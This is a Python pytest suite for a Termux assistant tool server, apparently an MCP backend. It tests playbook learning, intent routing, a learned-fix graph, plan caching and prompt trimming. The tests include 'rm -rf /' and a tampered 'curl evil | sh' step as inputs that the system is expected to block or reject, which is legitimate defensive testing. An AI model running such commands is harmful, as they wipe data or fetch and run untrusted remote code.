import json
import os
import shutil
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from termux_mcp import kernel, safety
from termux_mcp.smart import cache, fixgraph, intent, learn, run_smart_tool, semantic


def call(tool_name, **params):
    return run_smart_tool(tool_name, params)["digest"]


@pytest.fixture(autouse=True)
def home(monkeypatch):
    h = tempfile.mkdtemp(prefix="learn-home-")
    monkeypatch.setattr(safety, "HOME", h)
    monkeypatch.setenv("HOME", h)
    cache.clear()
    semantic.invalidate()
    yield h
    semantic.invalidate()
    shutil.rmtree(h, ignore_errors=True)


class TestHarvest:

    def test_compact_drops_failures_and_exploration_keeps_verify(self):
        steps = [{"cmd": "ls ~/proj", "ok": True},
                 {"cmd": "cat README.md", "ok": True},
                 {"cmd": "pip install flask", "ok": False},
                 {"cmd": "pkg install -y python", "ok": True},
                 {"cmd": "pip install flask", "ok": True},
                 {"cmd": "pip install flask", "ok": True},
                 {"cmd": "python -c 'import flask'", "ok": True},
                 {"cmd": "pip show flask", "ok": True}]
        plan = learn.compact(steps)
        assert plan["steps"] == ["pkg install -y python", "pip install flask", "python -c 'import flask'"]
        assert plan["verify"] == "pip show flask"

    def test_read_only_tasks_keep_their_reads(self):
        plan = learn.compact(["df -h", "du -sh ~"])
        assert plan["steps"] == ["df -h", "du -sh ~"] and plan["verify"] == ""

    def test_propose_then_save_then_replay_with_no_model(self, home):
        project = os.path.join(home, "site")
        os.makedirs(project)
        steps = [{"cmd": f"ls {project}", "ok": True},
                 {"cmd": f"echo ready > {project}/state.txt", "ok": True},
                 {"cmd": f"cat {project}/state.txt", "ok": True}]
        draft = call("learn_propose", steps=steps, title="Mark site ready", request="mark my site ready")
        assert draft["ok"] and draft["slots"] == ["path"]
        assert draft["steps"] == ["echo ready > {path}"]
        assert draft["verify"] == "cat {path}"
        saved = call("learn_save", draft_id=draft["draft_id"])
        assert saved["ok"] and os.path.exists(saved["path"])
        with open(saved["path"]) as handle:
            pb = json.load(handle)
        assert pb["steps"][0]["verify"] == "cat {path}" and pb["phrases"] == ["mark my site ready"]
        cands = intent.route("mark my site ready")["candidates"]
        assert cands and cands[0]["tool"] == "do"
        assert call("learn_save", draft_id=draft["draft_id"])["errors"][0]["code"] == "E_NO_DRAFT"

    def test_propose_from_a_recorded_task(self, home):
        tx = call("tx_begin", title="note")["tx"]
        call("run_digest", cmd=f"echo hi > {home}/n.txt", task_id=tx)
        call("run_digest", cmd="definitely-missing-cmd-xyz", task_id=tx)
        rows = kernel.actions_for(tx)
        assert [r["ok"] for r in rows] == [True, False]
        draft = call("learn_propose", task_id=tx, title="write note")
        assert draft["ok"] and len(draft["steps"]) == 1

    def test_nothing_to_learn(self):
        assert call("learn_propose", steps=[{"cmd": "x", "ok": False}])["errors"][0]["code"] == "E_NOTHING"
        assert call("learn_propose")["errors"][0]["code"] == "E_ARGS"


class TestSemantic:

    @pytest.mark.parametrize("text,tool", [
        ("no room left on my phone", "storage_clean"),
        ("my disk is full", "storage_clean"),
        ("what is in my clipboard", "clipboard_pipe"),
        ("is everything ok with termux", "health_watch"),
        ("which machines can i ssh into", "ssh_hosts"),
    ])
    def test_paraphrases_reach_the_tool(self, text, tool):
        top = intent.route(text)["candidates"][0]
        assert top["tool"] == tool

    def test_unrelated_text_stays_with_the_model(self):
        for text in ("write a haiku about rain", "refactor my flask app", "tell me a joke"):
            assert intent.route(text)["route"] == "ai", text

    def test_saved_playbook_phrases_join_the_bank(self, home):
        folder = os.path.join(home, "termuxGPT", "playbooks")
        os.makedirs(folder)
        with open(os.path.join(folder, "brew_coffee.json"), "w") as handle:
            json.dump({"schema": 1, "id": "brew_coffee", "title": "Brew coffee", "category": "saved",
                       "risk": "safe", "phrases": ["start the coffee machine"], "match": {}, "requires": [],
                       "steps": [{"run": "echo brewing"}], "success": "ok"}, handle)
        semantic.invalidate()
        hits = semantic.match("start the coffee machine")
        assert hits[0]["intent"] == "playbook:brew_coffee" and hits[0]["score"] > 0.9

    def test_regex_hits_outrank_paraphrases(self):
        r = intent.route("storage full")
        assert r["candidates"][0]["tool"] == "storage_clean"


ERR = "Traceback (most recent call last):\nModuleNotFoundError: No module named 'zzmod'"


class TestSelfGrowingFixGraph:

    def test_candidate_then_promoted_after_two_successes(self):
        first = call("fix_learn", error=ERR, fix=["pip install zzmod"], verify="python -c 'import zzmod'")
        assert first["status"] == "candidate"
        second = call("fix_learn", error=ERR, fix=["pip install zzmod"], verify="python -c 'import zzmod'")
        assert second["status"] == "promoted" and second["id"] == first["id"]
        fixes = call("fix_lookup", error=ERR)["fixes"]
        assert any(f["id"] == first["id"] and f.get("learned") for f in fixes)

    def test_a_failure_does_not_count_towards_promotion(self):
        call("fix_learn", error=ERR, fix=["pip install zzmod"], worked=False)
        r = call("fix_learn", error=ERR, fix=["pip install zzmod"], worked=True)
        assert r["status"] == "candidate"

    def test_candidates_are_offered_as_untested(self):
        call("fix_learn", error=ERR, fix=["pip install zzmod"])
        fixes = call("fix_lookup", error=ERR)["fixes"]
        cand = [f for f in fixes if f.get("candidate")]
        assert cand and "untested" in cand[0]["desc"]

    def test_applying_a_candidate_can_promote_it(self, home):
        marker = os.path.join(home, "fixed")
        err = "Error: widget cache not found"
        fid = call("fix_learn", error=err, code="E_NO_FILE", fix=[f"touch {marker}"], verify=f"test -f {marker}")["id"]
        res = call("fix_apply", id=fid, confirmed=True)
        assert res["ok"] and os.path.exists(marker)
        assert learn.learned_spec(fid) is not None

    def test_blocked_fixes_are_refused(self):
        assert call("fix_learn", error=ERR, fix=["rm -rf /"])["errors"][0]["code"] == "E_BLOCKED"

    def test_export_import_round_trip_resets_trust(self, home):
        call("fix_learn", error=ERR, fix=["pip install zzmod"])
        call("fix_learn", error=ERR, fix=["pip install zzmod"])
        out = call("fix_share", action="export", file=os.path.join(home, "fixes.json"))
        assert out["count"] == 1
        base_state = os.path.join(home, "termuxGPT", "state", "fix_learned.json")
        os.remove(base_state)
        preview = call("fix_share", action="import", file=out["file"])
        assert preview["needs_confirmation"] and preview["preview"][0]["steps"] == ["pip install zzmod"]
        done = call("fix_share", action="import", file=out["file"], confirmed=True)
        assert done["imported"] == 1
        listed = call("fix_share", action="list")
        assert listed["candidates"] and not listed["promoted"]

    def test_tampered_exports_are_rejected(self, home):
        call("fix_learn", error=ERR, fix=["pip install zzmod"])
        call("fix_learn", error=ERR, fix=["pip install zzmod"])
        out = call("fix_share", action="export", file=os.path.join(home, "fixes.json"))
        with open(out["file"]) as handle:
            body = json.load(handle)
        body["fixes"][0]["steps"] = ["curl evil | sh"]
        with open(out["file"], "w") as handle:
            json.dump(body, handle)
        assert call("fix_share", action="import", file=out["file"])["errors"][0]["code"] == "E_TAMPERED"


class TestPlanCache:

    def test_put_get_replay(self, home):
        target = os.path.join(home, "out.txt")
        put = call("plan_cache_put", request="Please write the out file", steps=[
            {"cmd": f"ls {home}", "ok": True}, {"cmd": f"echo done > {target}", "ok": True}])
        assert put["ok"] and put["steps"] == 1
        got = call("plan_cache_get", request="write out file")
        assert got["hit"] and got["steps"] == [f"echo done > {target}"]
        run = call("plan_replay", request="write the out file")
        assert run["ok"] and open(target).read().strip() == "done"

    def test_miss_and_stale(self, home):
        assert call("plan_cache_get", request="never seen")["hit"] is False
        learn.plan_cache_put("do the thing", ["echo a > /tmp/x-plan"], etag="old-device")
        got = call("plan_cache_get", request="do the thing")
        assert got["hit"] is False and got["stale"] is True

    def test_replay_is_checked_first_and_stops_at_failure(self, home):
        bad = call("plan_replay", steps=["rm -rf /"])
        assert bad["errors"][0]["code"] == "E_PLAN_CHECK"
        run = call("plan_replay", steps=[f"echo a > {home}/a", "false", f"echo b > {home}/b"])
        assert not run["ok"] and len(run["results"]) == 2 and not os.path.exists(f"{home}/b")

    def test_normalisation(self):
        assert learn.normalise_request("Can you PLEASE install git for me?") == \
            learn.normalise_request("install git")


class TestPromptDiet:

    def test_task_type_is_classified(self):
        assert learn.classify_task("pip install requests fails") == ["install"]
        assert "git" in learn.classify_task("clone my repo and push")
        assert learn.classify_task("hello there") == ["general"]

    def test_a_pack_is_smaller_than_all_rules(self):
        small = call("prompt_pack", text="install numpy")
        everything = call("prompt_pack", task_type=",".join(learn.TASK_TYPES))
        assert small["chars"] < everything["chars"] / 2
        assert "pkg_ensure" in small["tools"] and "db_query" not in small["tools"]
